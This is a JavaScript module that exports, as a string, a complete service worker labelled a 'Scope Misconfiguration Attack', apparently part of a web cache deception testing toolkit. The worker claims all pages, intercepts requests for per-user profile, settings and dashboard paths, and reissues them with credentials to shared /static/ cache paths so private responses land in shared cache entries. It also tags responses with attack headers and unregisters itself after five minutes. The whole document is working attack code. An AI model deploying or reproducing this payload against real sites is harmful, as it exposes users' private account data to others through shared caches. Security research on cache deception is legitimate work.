// T4: Scope Misconfiguration Attack - Complete implementation
const T4_SCOPE_MISCONFIG = `
// Service Worker: T4 Scope Misconfiguration Attack
// Targets: User-specific paths mapped to shared cache paths
// Technique: Path normalization to induce cache collisions

const ATTACK_CONFIG = {
  userPathPattern: /^\\/user\\/([^\\/]+)\\/(profile|settings|dashboard)/,
  sharedCachePaths: {
    'profile': '/static/user-profile-cache',
    'settings': '/static/user-settings-cache', 
    'dashboard': '/static/user-dashboard-cache'
  }
};

console.log('[SW-WCD-T4] Scope Misconfiguration activated');

self.addEventListener('install', (event) => {
  console.log('[SW-WCD-T4] Installing');
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', (event) => {
  console.log('[SW-WCD-T4] Activating and claiming clients');
  event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  const match = url.pathname.match(ATTACK_CONFIG.userPathPattern);
  
  if (match) {
    const [, userId, resourceType] = match;
    const sharedPath = ATTACK_CONFIG.sharedCachePaths[resourceType];
    
    if (sharedPath) {
      console.log(\`[SW-WCD-T4] Mapping user \${userId} \${resourceType} to shared path\`);
      
      const sharedURL = url.origin + sharedPath + url.search;
      
      const modifiedRequest = new Request(sharedURL, {
        method: event.request.method,
        headers: event.request.headers,
        credentials: 'include',
        mode: 'cors',
        redirect: 'follow'
      });
      
      event.respondWith(
        fetch(modifiedRequest)
          .then(response => {
            // Add attack metadata to response
            const attackHeaders = new Headers(response.headers);
            attackHeaders.set('X-SW-WCD-Attack', 'T4-Scope-Misconfig');
            attackHeaders.set('X-SW-WCD-Original-Path', url.pathname);
            attackHeaders.set('X-SW-WCD-Shared-Path', sharedPath);
            attackHeaders.set('X-SW-WCD-User-ID', userId);
            attackHeaders.set('X-SW-WCD-Resource-Type', resourceType);
            
            console.log(\`[SW-WCD-T4] Served shared cache for user \${userId}\`);
            
            return new Response(response.body, {
              status: response.status,
              statusText: response.statusText,
              headers: attackHeaders
            });
          })
          .catch(error => {
            console.error('[SW-WCD-T4] Attack failed:', error);
            return fetch(event.request);
          })
      );
    }
  }
});

// Safety: Auto-unregister after 5 minutes
setTimeout(() => {
  self.registration.unregister().then(success => {
    console.log('[SW-WCD-T4] Safety auto-unregister:', success);
  });
}, 300000);
`;

export { T4_SCOPE_MISCONFIG };